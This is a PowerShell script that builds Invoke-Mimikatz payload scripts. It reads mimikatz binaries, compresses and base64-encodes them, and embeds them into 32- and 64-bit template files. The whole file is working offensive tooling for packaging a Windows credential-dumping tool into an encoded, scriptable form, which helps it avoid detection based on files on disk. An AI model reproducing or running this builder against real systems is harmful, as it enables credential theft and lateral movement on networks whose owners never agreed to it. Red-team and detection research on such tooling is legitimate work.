function Get-PreparedMimikatzContent {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
		[byte[]] $MimiBin = $(Throw("-MimiBin is required")),

		[Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
		[string] $Content = $(Throw("-Content is required")),

		[Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
		[string] $Search = $(Throw("-Search is required"))
	)
	Process {
		[System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
		$gzipStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
		$gzipStream.Write( $MimiBin, 0, $MimiBin.Length )
		$gzipStream.Close()
		$output.Close()
		$tmp = [Convert]::ToBase64String($output.ToArray())
		$out = ($Content -replace $Search, $tmp)
		return $out
    }
}

function New-Mimiikatz64Script {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
		[string] $MimiBin = $(Throw("-MimiBin is required")),

		[Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
		[string] $OutFile = $(Throw("-OutFile is required"))

	)
	Process {
		$ByteArray = [System.IO.File]::ReadAllBytes($MimiBin)
		$TemplateContent = Get-Content -Path $PSScriptRoot\Invoke-Mimikatz64-Template.ps1 -Raw
		$Content = Get-PreparedMimikatzContent -MimiBin $ByteArray -Content $TemplateContent -Search "64BITBIN"
		$Content | Set-Content -Path $OutFile
	}
}

function New-MimiikatzScript {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
		[string] $MimiBin64 = $(Throw("-MimiBin64 is required")),

		[Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
		[string] $MimiBin32 = $(Throw("-MimiBin32 is required")),

		[Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
		[string] $OutFile = $(Throw("-OutFile is required"))

	)
	Process {
		$ByteArray = [System.IO.File]::ReadAllBytes($MimiBin64)
		$TemplateContent = Get-Content -Path $PSScriptRoot\Invoke-Mimikatz-Template.ps1 -Raw
		$Content = Get-PreparedMimikatzContent -MimiBin $ByteArray -Content $TemplateContent -Search "64BITBIN"
		$ByteArray = [System.IO.File]::ReadAllBytes($MimiBin32)
		$Content = Get-PreparedMimikatzContent -MimiBin $ByteArray -Content $Content -Search "32BITBIN"
		$Content | Set-Content -Path $OutFile
	}
}
